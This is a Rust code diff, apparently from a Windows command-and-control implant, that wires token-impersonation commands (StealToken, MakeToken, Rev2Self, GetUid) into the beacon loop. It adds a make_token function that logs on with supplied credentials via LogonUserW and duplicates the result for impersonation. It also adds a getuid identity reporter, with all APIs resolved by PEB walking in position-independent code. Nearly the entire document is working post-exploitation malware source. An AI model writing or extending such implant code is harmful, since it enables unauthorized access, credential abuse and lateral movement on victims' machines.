@@ -6,12 +6,12 @@
 //!   - [`revert`]       — drop impersonation (RevertToSelf).
 //!   - [`current`]      — report whether the thread is currently impersonating.
 //!
-//! ## Why here, not as wire commands
-//! These aren't (yet) first-class `Command` variants in the protocol — they're
-//! the building blocks a future `pth`/`steal_token`/`runas` command surface
-//! would call. Exposing them now means a BOF (or a future command) can import
-//! them without re-implementing the advapi32 dance. The token state lives in a
-//! process-wide static so it survives across beacon cycles.
+//! ## Wire commands
+//! These are exposed as first-class `Command` variants dispatched from the
+//! beacon loop: [`crate::beacon`] routes `StealToken`/`MakeToken`/`Rev2Self`/
+//! `GetUid` to [`steal_token`]/[`make_token`]/[`revert`]/[`getuid`] here. The
+//! token state lives in a process-wide static so it survives across beacon
+//! cycles; the beacon loop is single-threaded so one slot is enough.
 //!
 //! All advapi32 exports are resolved via the PEB walk; advapi32 is force-loaded
 //! (not present by default in a minimal PIC process).
@@ -19,6 +19,7 @@
 #![cfg(target_os = "windows")]
 
 use crate::resolve::export_addr;
+use alloc::string::String;
 use core::ffi::c_void;
 use core::sync::atomic::{AtomicUsize, Ordering};
 
@@ -162,8 +163,254 @@ pub fn revert() -> Result<(), &'static str> {
     Ok(())
 }
 
-/// Whether a stolen token is currently held (not whether it's actively
-/// impersonating — call use_token for that).
+/// Whether a stolen/made token is currently held (not whether it's actively
+/// impersonating — call [`use_token`] for that).
 pub fn current() -> bool {
     IMPERSONATION.load(Ordering::Relaxed) != 0
+}
+
+/// Create a new logon token via `LogonUserW` (make-token / pass-the-password).
+/// `domain`\`user` + `password` (empty domain = local account, "." = this
+/// machine). `logon_type`: 1=INTERACTIVE (default), 2=NETWORK,
+/// 3=NEW_CREDENTIALS. The resulting token is held process-wide (overrides a
+/// prior stolen/made token). Returns Ok(()) on success.
+///
+/// **Safety:** resolves advapi32 via PEB walk; same single-threaded contract as
+/// [`steal_token`].
+pub unsafe fn make_token(
+    domain: &str,
+    user: &str,
+    password: &str,
+    logon_type: u8,
+) -> Result<(), &'static str> {
+    if !force_load(b"advapi32.dll") {
+        return Err("make_token: advapi32.dll load failed");
+    }
+    type LogonUserW = unsafe extern "system" fn(
+        *const u16, // username
+        *const u16, // domain
+        *const u16, // password
+        u32,        // logon type
+        u32,        // logon provider (0 = DEFAULT)
+        *mut *mut c_void, // phToken
+    ) -> i32;
+    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
+    type DuplicateTokenEx = unsafe extern "system" fn(
+        *mut c_void,
+        u32,
+        *const c_void,
+        u32,
+        u32,
+        *mut *mut c_void,
+    ) -> i32;
+
+    let lu: LogonUserW = match unsafe { export_addr(b"advapi32.dll", b"LogonUserW") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Err("make_token: LogonUserW unresolved"),
+    };
+    let close: CloseHandle = match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Err("make_token: CloseHandle unresolved"),
+    };
+    let dte: DuplicateTokenEx = match unsafe { export_addr(b"advapi32.dll", b"DuplicateTokenEx") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Err("make_token: DuplicateTokenEx unresolved"),
+    };
+
+    // Win32 wants UTF-16 wide strings. They live on the stack for this call.
+    let mut wuser = [0u16; 256];
+    let mut wdom = [0u16; 256];
+    let mut wpass = [0u16; 256];
+    // Copy UTF-16 code units into a NUL-terminated fixed buffer (truncates
+    // safely if longer than the buffer — a 255-char password is already absurd).
+    fn widen(dst: &mut [u16], s: &str) {
+        for (out, c) in dst.iter_mut().zip(s.encode_utf16()) {
+            *out = c;
+        }
+    }
+    widen(&mut wuser, user);
+    widen(&mut wdom, domain);
+    widen(&mut wpass, password);
+
+    // Close any previously-held token first (one slot).
+    let prev = IMPERSONATION.swap(0, Ordering::Relaxed);
+    if prev != 0 {
+        let _ = close(prev as *mut c_void);
+    }
+
+    let mut primary: *mut c_void = core::ptr::null_mut();
+    // logon_type 0 is invalid → default to 1 (INTERACTIVE).
+    let lt = match logon_type {
+        2 => 2u32, // NETWORK
+        3 => 3u32, // NEW_CREDENTIALS
+        _ => 1u32, // INTERACTIVE
+    };
+    let ok = unsafe {
+        lu(
+            wuser.as_ptr(),
+            wdom.as_ptr(),
+            wpass.as_ptr(),
+            lt,
+            0,
+            &mut primary,
+        )
+    };
+    if ok == 0 || primary.is_null() {
+        return Err("make_token: LogonUserW failed (creds? privileges?)");
+    }
+    // Duplicate to an impersonation token (so it can be used like a stolen one)
+    // and close the primary. TokenType 1 = TokenImpersonation.
+    let mut dup: *mut c_void = core::ptr::null_mut();
+    let ok = unsafe {
+        dte(
+            primary,
+            TOKEN_ALL_ACCESS,
+            core::ptr::null(),
+            SECURITY_IMPERSONATION,
+            1,
+            &mut dup,
+        )
+    };
+    let _ = close(primary);
+    if ok == 0 || dup.is_null() {
+        return Err("make_token: DuplicateTokenEx failed");
+    }
+    IMPERSONATION.store(dup as usize, Ordering::Relaxed);
+    Ok(())
+}
+
+/// Report the current thread identity as `DOMAIN\user` (allocated String), plus
+/// whether a stolen/made token is held. Uses `OpenThreadToken` →
+/// `GetTokenInformation(TokenUser)` → `LookupAccountSidW`. If not impersonating,
+/// reports the process identity instead. Never panics (PEB-resolved, all errors
+/// → a placeholder string).
+pub fn getuid() -> String {
+    use crate::resolve::export_addr;
+    if !force_load(b"advapi32.dll") {
+        return String::from("getuid: advapi32.dll load failed");
+    }
+    // Best-effort: OpenThreadToken(GetCurrentThread); fall back to
+    // OpenProcessToken(GetCurrentProcess). Then GetTokenInformation(TokenUser)
+    // → LookupAccountSidW for DOMAIN\user.
+    type GetCurrentThread = unsafe extern "system" fn() -> *mut c_void;
+    type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
+    type OpenThreadToken = unsafe extern "system" fn(*mut c_void, u32, i32, *mut *mut c_void) -> i32;
+    type OpenProcessToken = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
+    type GetTokenInformation = unsafe extern "system" fn(
+        *mut c_void, // TokenHandle
+        u8,          // TOKEN_INFORMATION_CLASS (1 = TokenUser)
+        *mut u8,     // TokenInformation
+        u32,         // TokenInformationLength
+        *mut u32,    // ReturnLength
+    ) -> i32;
+    type LookupAccountSidW = unsafe extern "system" fn(
+        *const u16,             // lpSystemName (NULL)
+        *const c_void,          // Sid
+        *mut u16,               // Name
+        *mut u32,               // cchName
+        *mut u16,               // ReferencedDomainName
+        *mut u32,               // cchDomainName
+        *mut u8,                // peUse
+    ) -> i32;
+    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
+
+    let gct: GetCurrentThread =
+        match unsafe { export_addr(b"kernel32.dll", b"GetCurrentThread") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return String::from("getuid: GetCurrentThread unresolved"),
+        };
+    let gcp: GetCurrentProcess =
+        match unsafe { export_addr(b"kernel32.dll", b"GetCurrentProcess") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return String::from("getuid: GetCurrentProcess unresolved"),
+        };
+    let ott: OpenThreadToken = match unsafe { export_addr(b"advapi32.dll", b"OpenThreadToken") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return String::from("getuid: OpenThreadToken unresolved"),
+    };
+    let opt: OpenProcessToken = match unsafe { export_addr(b"advapi32.dll", b"OpenProcessToken") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return String::from("getuid: OpenProcessToken unresolved"),
+    };
+    let gti: GetTokenInformation =
+        match unsafe { export_addr(b"advapi32.dll", b"GetTokenInformation") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return String::from("getuid: GetTokenInformation unresolved"),
+        };
+    let las: LookupAccountSidW = match unsafe { export_addr(b"advapi32.dll", b"LookupAccountSidW") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return String::from("getuid: LookupAccountSidW unresolved"),
+    };
+    let close: CloseHandle = match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return String::from("getuid: CloseHandle unresolved"),
+    };
+
+    // Try thread token first (impersonating); fall back to process token.
+    let mut tok: *mut c_void = core::ptr::null_mut();
+    let thread = unsafe { gct() };
+    let _ = unsafe { ott(thread, TOKEN_QUERY, 1, &mut tok) };
+    let mut impersonating = !tok.is_null();
+    if tok.is_null() {
+        let proc = unsafe { gcp() };
+        if unsafe { opt(proc, TOKEN_QUERY, &mut tok) } == 0 || tok.is_null() {
+            return String::from("getuid: no token");
+        }
+    }
+
+    // TOKEN_USER layout: { SID_AND_ATTRIBUTES { PVOID Sid; ULONG Attributes; } }
+    // = 8 + 4 = 12 bytes (SID_AND_ATTRIBUTES is pointer-sized ptr + u32).
+    let mut buf = [0u8; 64];
+    let mut retlen: u32 = 0;
+    let ok = unsafe { gti(tok, 1, buf.as_mut_ptr(), buf.len() as u32, &mut retlen) };
+    let _ = unsafe { close(tok) };
+    if ok == 0 || retlen < 8 {
+        return String::from("getuid: GetTokenInformation failed");
+    }
+    // Sid pointer = first 8 bytes (a *mut on x64).
+    let sid_ptr = u64::from_le_bytes(buf[0..8].try_into().unwrap_or([0u8; 8])) as *const c_void;
+    if sid_ptr.is_null() {
+        return String::from("getuid: null SID");
+    }
+
+    let mut name = [0u16; 256];
+    let mut domain = [0u16; 256];
+    let mut cch_name: u32 = name.len() as u32;
+    let mut cch_dom: u32 = domain.len() as u32;
+    let mut pe_use: u8 = 0;
+    let ok = unsafe {
+        las(
+            core::ptr::null(),
+            sid_ptr,
+            name.as_mut_ptr(),
+            &mut cch_name,
+            domain.as_mut_ptr(),
+            &mut cch_dom,
+            &mut pe_use,
+        )
+    };
+    if ok == 0 {
+        return String::from("getuid: LookupAccountSidW failed");
+    }
+    let wide_to_string = |w: &[u16]| {
+        let len = w.iter().position(|&c| c == 0).unwrap_or(w.len());
+        alloc::string::String::from_utf16_lossy(&w[..len])
+    };
+    let dom = wide_to_string(&domain);
+    let usr = wide_to_string(&name);
+    let mut out = if dom.is_empty() {
+        usr
+    } else {
+        let mut s = String::with_capacity(dom.len() + 1 + usr.len());
+        s.push_str(&dom);
+        s.push('\\');
+        s.push_str(&usr);
+        s
+    };
+    if impersonating {
+        out.push_str(" (impersonating)");
+    } else if current() {
+        out.push_str(" (token held, not impersonating)");
+    }
+    out
 }
